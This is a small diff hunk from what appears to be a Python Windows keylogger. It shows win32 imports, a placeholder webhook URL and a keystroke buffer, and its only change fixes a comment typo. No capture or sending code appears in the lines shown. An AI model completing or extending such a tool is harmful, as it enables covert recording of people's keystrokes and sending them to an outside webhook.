@@ -4,7 +4,7 @@ import json
 import win32gui
 import win32con
 
-#this tuff just needed
+#this stuff is just needed
 webhook_url = 'your webhook goes here'
 keys_buffer = [] #dont touch this
 
